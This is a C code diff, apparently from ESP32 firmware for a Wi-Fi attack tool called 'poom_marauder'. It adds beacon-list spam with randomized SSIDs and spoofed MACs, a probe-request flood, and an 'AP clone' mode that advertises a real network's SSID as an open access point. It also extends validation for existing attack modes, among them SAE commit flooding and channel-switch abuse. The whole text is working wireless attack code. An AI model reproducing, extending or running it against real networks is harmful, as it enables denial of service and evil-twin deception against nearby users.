@@ -84,14 +84,15 @@ static bool modern_key_descriptor(wifi_auth_mode_t auth)
 
 static esp_err_t normalize_config(poom_marauder_config_t *config)
 {
-    if (config->mode < POOM_MARAUDER_BAD_MSG || config->mode > POOM_MARAUDER_SAE_COMMIT ||
+    if (config->mode < POOM_MARAUDER_BAD_MSG || config->mode > POOM_MARAUDER_BEACON_LIST ||
         !unicast_mac(config->ap.bssid) ||
         !poom_wifi_ctrl_channel_is_valid(config->ap.primary) ||
         config->client_count > POOM_MARAUDER_MAX_CLIENTS) return ESP_ERR_INVALID_ARG;
     if (config->duration_ms == 0) config->duration_ms = POOM_MARAUDER_DEFAULT_DURATION_MS;
-    if (config->interval_ms == 0) config->interval_ms = POOM_MARAUDER_DEFAULT_INTERVAL_MS;
+    const uint32_t min_interval = config->mode == POOM_MARAUDER_BEACON_LIST ? 10U : POOM_MARAUDER_DEFAULT_INTERVAL_MS;
+    if (config->interval_ms == 0) config->interval_ms = min_interval;
     if (config->duration_ms > POOM_MARAUDER_MAX_DURATION_MS ||
-        config->interval_ms < POOM_MARAUDER_DEFAULT_INTERVAL_MS || config->interval_ms > 5000U)
+        config->interval_ms < min_interval || config->interval_ms > 5000U)
         return ESP_ERR_INVALID_ARG;
     if (config->mode == POOM_MARAUDER_BAD_MSG || config->mode == POOM_MARAUDER_ASSOC_SLEEP) {
         if (config->client_count == 0) return ESP_ERR_INVALID_ARG;
@@ -104,6 +105,14 @@ static esp_err_t normalize_config(poom_marauder_config_t *config)
     }
     if (config->mode == POOM_MARAUDER_SAE_COMMIT && !personal_sae(config->ap.authmode))
         return ESP_ERR_NOT_SUPPORTED;
+    if ((config->mode == POOM_MARAUDER_PROBE_REQUEST || config->mode == POOM_MARAUDER_AP_CLONE) &&
+        config->ap.ssid[0] == 0) return ESP_ERR_INVALID_ARG;
+    if(config->mode == POOM_MARAUDER_BEACON_LIST) {
+        if(!config->beacon_count || config->beacon_count > POOM_MARAUDER_MAX_BEACONS) return ESP_ERR_INVALID_ARG;
+        for(size_t i = 0; i < config->beacon_count; ++i) {
+            if(!config->beacon_ssids[i][0] || strnlen(config->beacon_ssids[i], 33) > 32) return ESP_ERR_INVALID_SIZE;
+        }
+    }
     if (config->mode == POOM_MARAUDER_CSA) {
         if (config->csa_channel == 0)
             config->csa_channel = config->ap.primary > 14 ? (config->ap.primary == 36 ? 40 : 36) : (config->ap.primary == 1 ? 6 : 1);
@@ -148,9 +157,25 @@ static esp_err_t sae_material(uint8_t scalar[32], uint8_t point[64])
     return ESP_OK;
 }
 
+static void random_beacon_cycle(poom_marauder_config_t *config)
+{
+    static const char alphabet[] = "abcdefghijklmnopqrstuvwxyz0123456789";
+    esp_fill_random(config->ap.bssid, 6);
+    config->ap.bssid[0] = (config->ap.bssid[0] & 0xfcU) | 0x02U;
+    for(size_t i = 0; i < config->beacon_count; ++i) {
+        uint8_t entropy[16];
+        esp_fill_random(entropy, sizeof(entropy));
+        /* The index suffix makes every identity unique even with a poor RNG. */
+        const size_t n = 8U + entropy[0] % 7U;
+        for(size_t j = 0; j < n; ++j) config->beacon_ssids[i][j] = alphabet[entropy[j] % (sizeof(alphabet) - 1U)];
+        config->beacon_ssids[i][n] = alphabet[i % (sizeof(alphabet) - 1U)];
+        config->beacon_ssids[i][n + 1U] = 0;
+    }
+}
+
 static void attack_worker(void *argument)
 {
-    const poom_marauder_config_t config = *(poom_marauder_config_t *)argument;
+    poom_marauder_config_t config = *(poom_marauder_config_t *)argument;
     free(argument);
     poom_marauder_frame_target_t ap = {0};
     memcpy(ap.bssid, config.ap.bssid, 6);
@@ -159,9 +184,19 @@ static void attack_worker(void *argument)
     ap.channel = config.ap.primary;
     ap.privacy = config.ap.authmode != WIFI_AUTH_OPEN;
     ap.wpa3 = modern_key_descriptor(config.ap.authmode);
+    if(config.mode == POOM_MARAUDER_AP_CLONE) {
+        /* Distinct local identity even when the chosen AP already uses a
+         * locally administered BSSID. Only its SSID and channel are copied. */
+        ap.bssid[0] = (ap.bssid[0] & 0xfcU) | 0x02U;
+        ap.bssid[5] ^= 0x80U;
+        ap.privacy = false;
+    }
     uint16_t sequence = 0;
     uint64_t replay = 1;
     size_t client_index = 0;
+    size_t beacon_index = 0;
+    uint32_t next_cycle_ms = 0;
+    uint16_t beacon_sequences[POOM_MARAUDER_MAX_BEACONS] = {0};
     uint8_t frame[POOM_MARAUDER_FRAME_CAPACITY];
 
     while (!stop_requested() && elapsed_ms() < config.duration_ms) {
@@ -179,6 +214,26 @@ static void attack_worker(void *argument)
             length = poom_marauder_frame_beacon(frame, sizeof(frame), &ap,
                 sequence++, (uint64_t)esp_timer_get_time(), config.mode == POOM_MARAUDER_QUIET,
                 config.csa_channel);
+        } else if(config.mode == POOM_MARAUDER_PROBE_REQUEST) {
+            uint8_t source[6];
+            esp_fill_random(source, sizeof(source));
+            source[0] = (source[0] & 0xfcU) | 0x02U;
+            length = poom_marauder_frame_probe(frame, sizeof(frame), &ap, source, sequence++);
+        } else if(config.mode == POOM_MARAUDER_AP_CLONE) {
+            length = poom_marauder_frame_advert(frame, sizeof(frame), &ap, sequence++, (uint64_t)esp_timer_get_time());
+        } else if(config.mode == POOM_MARAUDER_BEACON_LIST) {
+            if(config.random_beacon_cycles && elapsed_ms() >= next_cycle_ms) {
+                random_beacon_cycle(&config);
+                memset(beacon_sequences, 0, sizeof(beacon_sequences));
+                next_cycle_ms = elapsed_ms() + 10000U;
+            }
+            memcpy(ap.bssid, config.ap.bssid, sizeof(ap.bssid));
+            ap.bssid[5] ^= (uint8_t)beacon_index;
+            ap.ssid_len = strnlen(config.beacon_ssids[beacon_index], sizeof(ap.ssid));
+            memcpy(ap.ssid, config.beacon_ssids[beacon_index], ap.ssid_len);
+            length = poom_marauder_frame_advert(frame, sizeof(frame), &ap,
+                beacon_sequences[beacon_index]++, (uint64_t)esp_timer_get_time());
+            beacon_index = (beacon_index + 1U) % config.beacon_count;
         } else {
             uint8_t scalar[32], point[64], source[6];
             error = sae_material(scalar, point);
